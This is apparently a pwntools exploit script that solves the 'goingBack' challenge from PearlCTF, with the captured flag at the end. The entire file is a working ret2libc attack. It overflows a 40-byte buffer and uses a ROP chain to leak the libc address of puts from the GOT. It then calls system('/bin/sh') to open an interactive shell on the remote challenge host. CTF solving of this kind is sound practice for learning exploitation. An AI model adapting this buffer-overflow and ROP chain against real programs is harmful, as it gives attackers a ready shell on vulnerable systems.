#!/usr/bin/python3

from pwn import *

exe = ELF('goingBack_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x40131B

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('dyn.ctf.pearlctf.in', 30011)
else:
        p = process(exe.path)
pop_rdi = 0x0000000000401265
GDB()
sla(b'Name: ', b'wan')
sla(b'Name: ', b'wan')
sla(b'Age: ', b'20')
sla(b'Bangalore', b'wan')
sla(b' (1/0):', '0')
sla(b'1 to 5: ', b'0')
payload = b'a' * 40 + flat(pop_rdi, exe.got.puts, exe.plt.puts, 0x40126A)
sla(b'experience\n', payload)
libc.address = u64(p.recvline(keepends=False) + b'\0\0') - libc.sym.puts
info("libc.address: " + hex(libc.address))

sla(b'1 to 5: ', b'0')
payload = b'a' * 40 + flat(pop_rdi+1,pop_rdi, next(libc.search(b'/bin/sh')),libc.sym.system)
sla(b'experience\n', payload)
p.interactive()
# pearl{r3turn_70_l1bc_1s_e4szzyy_p3azyyy!!!!}